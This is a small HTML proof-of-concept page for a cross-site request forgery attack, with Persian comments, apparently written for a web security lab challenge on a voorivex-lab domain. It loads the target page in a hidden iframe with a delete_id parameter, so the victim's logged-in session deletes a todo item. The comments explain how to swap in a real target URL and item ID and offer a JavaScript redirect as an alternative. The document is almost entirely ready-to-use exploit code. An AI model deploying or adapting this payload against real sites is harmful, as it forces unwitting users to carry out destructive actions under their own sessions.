<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h3>Loading...</h3>
    <!--
        این PoC با استفاده از iframe مخفی، صفحه‌ی هدف رو با پارامتر delete_id لود می‌کنه.
        وقتی صفحه داخل iframe لود بشه، اسکریپت خودِ صفحه (که در سورس دیدی) اجرا می‌شه
        و چون قربانی لاگین/سشن‌دار هست، deleteTodo(id) با کوکی‌های اون اجرا می‌شه.

        نکات مهم برای شخصی‌سازی:
        1. TARGET_URL رو با آدرس واقعی صفحه‌ی چالش عوض کن.
        2. TODO_ID رو با شناسه‌ی موردنظر (که می‌خوای حذف بشه) عوض کن.
    -->
    <iframe src="https://zv6gmy6ddk.voorivex-lab.online/?delete_id=0" style="display:none;"></iframe>

    <!--
        روش جایگزین (بدون iframe)، اگه بخوای مستقیم ریدایرکت کنی:
        <script>
            window.location = "https://TARGET_URL/?delete_id=TODO_ID";
        </script>
    -->
</body>
</html>
